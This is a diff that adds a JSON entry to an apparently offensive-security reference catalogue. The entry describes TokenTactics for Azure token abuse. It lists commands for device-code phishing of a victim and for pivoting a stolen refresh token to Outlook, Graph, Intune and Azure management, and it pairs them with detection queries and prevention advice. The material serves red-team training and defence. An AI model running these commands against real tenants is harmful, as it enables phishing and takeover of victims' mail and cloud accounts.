@@ -1,0 +1,105 @@
+{
+  "id": "cloud-tokentactics",
+  "name": "TokenTactics - Azure Token Manipulation",
+  "command": "Import-Module TokenTactics; Get-AzureToken -Client MSGraph",
+  "description": "TokenTactics is a PowerShell module for abusing Azure JWT access and refresh tokens. After a device-code or stolen refresh token, it swaps a refresh token for access tokens to many first-party resources (MSGraph, AADGraph, Outlook, Substrate, DeviceManagement, etc.), enabling lateral movement across M365 services without re-prompting the user.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "rvrsh3ll/TokenTactics",
+  "tags": [
+    "tokentactics",
+    "azure",
+    "entra-id",
+    "token",
+    "refresh-token",
+    "device-code",
+    "m365"
+  ],
+  "mitre": [
+    "T1528",
+    "T1550.001",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INSTALL ===\n  Import-Module .\\TokenTactics.psd1\n\n=== DEVICE-CODE PHISH (get first tokens) ===\n  Get-AzureToken -Client MSGraph\n  # prints a microsoft.com/devicelogin code; victim enters it -> you receive tokens\n\n=== REFRESH -> NEW RESOURCE TOKENS ===\n  # once you hold $response.refresh_token, pivot to other audiences:\n  RefreshTo-MSGraphToken   -domain <domain> -refreshToken $rt\n  RefreshTo-OutlookToken   -domain <domain> -refreshToken $rt\n  RefreshTo-AzureCoreManagementToken -domain <domain> -refreshToken $rt\n  RefreshTo-DeviceManagementToken   -domain <domain> -refreshToken $rt   # Intune\n  RefreshTo-SubstrateToken -domain <domain> -refreshToken $rt\n\n=== USE THE TOKEN ===\n  # feed $token.access_token to MSGraph calls, roadrecon, or AADInternals -AccessToken\n\n=== DECODE / INSPECT ===\n  Parse-JWTtoken -token $token.access_token    # aud, scp, roles, upn\n\n=== ALTERNATIVES ===\n  AADInternals   # broader toolkit incl. token acquisition\n  GraphRunner    # Graph-centric post-ex\n  roadtx (ROADtools) # token flows incl. PRT",
+  "examples": [
+    {
+      "label": "Device-code token request",
+      "command": "Get-AzureToken -Client MSGraph"
+    },
+    {
+      "label": "Pivot refresh token to Outlook",
+      "command": "RefreshTo-OutlookToken -domain <domain> -refreshToken $rt"
+    },
+    {
+      "label": "Decode a JWT",
+      "command": "Parse-JWTtoken -token $token.access_token"
+    }
+  ],
+  "references": [
+    {
+      "title": "TokenTactics",
+      "url": "https://github.com/rvrsh3ll/TokenTactics"
+    },
+    {
+      "title": "MITRE T1550.001",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-aadinternals",
+      "note": "AADInternals consumes the same tokens for broader attacks.",
+      "rel": "next"
+    },
+    {
+      "id": "cloud-graphrunner",
+      "note": "GraphRunner for Graph post-exploitation with the token.",
+      "rel": "next"
+    },
+    {
+      "id": "azure-authentication",
+      "note": "Underlying Entra auth flows abused here.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "OAuth refresh tokens are long-lived bearer artifacts. A refresh token for one first-party client can be redeemed for access tokens to other first-party resources (family-of-client-ids), so a single phished token grants wide reach without MFA re-prompts.",
+    "prerequisites": "A valid refresh token (from device-code phishing, token theft, or a stolen PRT). No password needed once the refresh token is held.",
+    "impact": "Cross-service access (mail, files, Intune, Azure management) as the victim, persistent until the refresh token is revoked or Conditional Access re-evaluates.",
+    "detection": "[MITRE T1550.001] Entra sign-in logs showing token redemptions across many first-party app IDs from one refresh token / IP in a short window; device-code authentications; impossible-travel between original sign-in and token-use IP.",
+    "artifacts": "Entra sign-in logs (appDisplayName variety, authenticationProtocol=deviceCode), token issuance bursts, unfamiliar client/IP combinations.",
+    "splunk_spl": "index=azure sourcetype=azure:aad:signin\n| stats dc(appDisplayName) as apps values(appDisplayName) as app_list by userPrincipalName, ipAddress, bin(_time,1h)\n| where apps > 4",
+    "elastic_kql": "azure.signinlogs.properties.authentication_protocol:deviceCode or azure.signinlogs.properties.app_display_name:*",
+    "sentinel_kql": "SigninLogs\n| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName) by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)\n| where Apps > 4",
+    "sigma_rules": "azure_tokentactics_cross_resource_token_use",
+    "prevention": "Conditional Access with device compliance and sign-in risk policies; block/limit device-code flow; shorten token lifetimes and enable continuous access evaluation (CAE); revoke refresh tokens on risk; phishing-resistant MFA (FIDO2).",
+    "sources": [
+      "rvrsh3ll/TokenTactics",
+      "https://attack.mitre.org/techniques/T1550/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Single identity redeeming tokens for many first-party apps",
+        "logic": "SigninLogs\n| where ResultType == 0\n| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName), IPs=make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where Apps > 4",
+        "data_source": "entra-id",
+        "attack": [
+          "T1550.001",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Power users with many integrated apps",
+        "tuning": "Baseline per-user app breadth; weight by new IP"
+      }
+    ]
+  }
+}
